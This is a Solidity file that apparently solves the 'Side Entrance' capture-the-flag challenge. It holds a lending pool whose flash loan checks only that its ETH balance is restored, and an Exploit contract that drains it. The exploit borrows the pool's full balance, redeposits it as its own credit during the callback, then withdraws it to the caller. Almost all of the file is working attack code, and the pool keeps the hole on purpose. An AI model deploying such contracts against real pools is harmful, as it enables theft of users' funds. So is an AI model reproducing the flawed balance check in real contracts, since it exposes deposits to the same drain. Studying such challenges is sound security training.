pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

contract Exploit {

    SideEntranceLenderPool pool;

    constructor(address _poolAddress) public {
        pool = SideEntranceLenderPool(_poolAddress);
    }

    function exploit() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external payable {
        pool.withdraw();
        msg.sender.transfer(address(this).balance);
    }

    fallback() external payable {}

}
 